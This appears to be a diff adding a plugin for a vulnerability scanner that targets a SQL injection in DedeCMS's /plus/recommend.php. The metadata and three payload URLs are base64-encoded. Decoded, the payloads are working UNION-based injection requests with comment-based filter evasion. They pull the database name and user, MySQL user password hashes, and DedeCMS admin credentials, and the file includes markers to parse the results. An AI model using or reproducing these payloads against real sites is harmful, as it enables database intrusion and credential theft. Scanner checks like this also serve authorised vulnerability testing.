@@ -1,0 +1,25 @@
+<info>
+	<name>DedeCMS /plus/recommend.php注入(20140228)</name>
+	<desc>5Y+R5biD5pel5pyfOiAyMDE0LjAyLjI4DQrmvI/mtJ7or6bmg4U6IOWPguaVsOWkhOeQhuS4jeW9k+WvvOiHtERlZGVDTVPmlofmoaPmjqjojZDlip/og73lrZjlnKjms6jlhaXvvIzmlLvlh7vogIXlj6/lvpfliLDnm67moIfnq5nngrnnmoTmlbDmja7lupPmlbDmja7lhoXlrrkNCuW9seWTjeeJiOacrDog5bey55+lRGVkZUNNU1Y1N19VVEY4X1NQMeWPl+W9seWTjQ==</desc>
+	<conf>VEFSR0VUX1NJVEU9aHR0cDovL3d3dy5oZW5sZWFyLmNvbQ0KRU5E</conf>
+	<catgory>V2Vi5bqU55SoL0RlZGVDTVM=</catgory>
+</info>
+<unvulnerable>5oGt5Zac77yM5LiN5a2Y5Zyo5ryP5rSe</unvulnerable>
+<vulnerable>55uu5qCH5Li75py65a2Y5Zyo5ryP5rSe</vulnerable>
+<fix>6K+35Y2H57qnRGVkZUNNU+WIsOacgOaWsOeJiA==</fix>
+
+<payload method=1>
+<url>VEFSR0VUX1NJVEUvcGx1cy9yZWNvbW1lbmQucGhwP2FjdGlvbj0mYWlkPTEmX0ZJTEVTW3R5cGVdW3RtcF9uYW1lXT1cJTI3JTIwJTIwb3IlMjBtaWQ9QGBcJTI3YCUyMC8qITUwMDAwdW5pb24qLy8qITUwMDAwc2VsZWN0Ki8xLDIsMywoc2VsZWN0JTIwQ09OQ0FUKGRhdGFiYXNlKCksMHgzYSx1c2VyKCkpK2Zyb20rYCUyM0BfX2FkbWluYCUyMGxpbWl0KzAsMSksNSw2LDcsOCw5JTIzQGBcJTI3YCsmX0ZJTEVTW3R5cGVdW25hbWVdPTEuanBnJl9GSUxFU1t0eXBlXVt0eXBlXT1hcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0mX0ZJTEVTW3R5cGVdW3NpemVdPTY4ODc=</url>
+	<sign type=2 start="文档的名称是：" stop="网址是："></sign>
+	<data>5rOo5YWl57uT5p6cOiA=</data>
+</payload>
+<payload method=1>
+<url>VEFSR0VUX1NJVEUvcGx1cy9yZWNvbW1lbmQucGhwP2FpZD0xJl9GSUxFU1t0eXBlXVtuYW1lXSZfRklMRVNbdHlwZV1bc2l6ZV0mX0ZJTEVTW3R5cGVdW3R5cGVdJl9GSUxFU1t0eXBlXVt0bXBfbmFtZV09YWFcJTI3YW5kK2NoYXIoQGAlMjdgKSsvKiE1MDAwMFVuaW9uKi8rLyohNTAwMDBTZUxlY3QqLysxLDIsMyxncm91cF9jb25jYXQodXNlciwweDNhLHBhc3N3b3JkKSw1LDYsNyw4LDklMjBmcm9tJTIwbXlzcWwudXNlciUyMw==</url>
+	<sign type=2 start="文档的名称是：" stop="网址是："></sign>
+	<data>5rOo5YWl57uT5p6cOiA=</data>
+</payload>
+<payload method=1>
+<url>VEFSR0VUX1NJVEUvcGx1cy9yZWNvbW1lbmQucGhwP2FpZD0xJl9GSUxFU1t0eXBlXVtuYW1lXSZfRklMRVNbdHlwZV1bc2l6ZV0mX0ZJTEVTW3R5cGVdW3R5cGVdJl9GSUxFU1t0eXBlXVt0bXBfbmFtZV09YWFcJTI3YW5kK2NoYXIoQGAlMjdgKSsvKiE1MDAwMFVuaW9uKi8rLyohNTAwMDBTZUxlY3QqLyUyMCsxLDIsMyxncm91cF9jb25jYXQodXNlcmlkLDB4M2EscHdkKSw1LDYsNyw4LDklMjBmcm9tJTIwYCUyM0BfX2FkbWluYCUyMw==</url>
+	<sign type=2 start="文档的名称是：" stop="网址是："></sign>
+	<data>5rOo5YWl57uT5p6cOiA=</data>
+</payload>
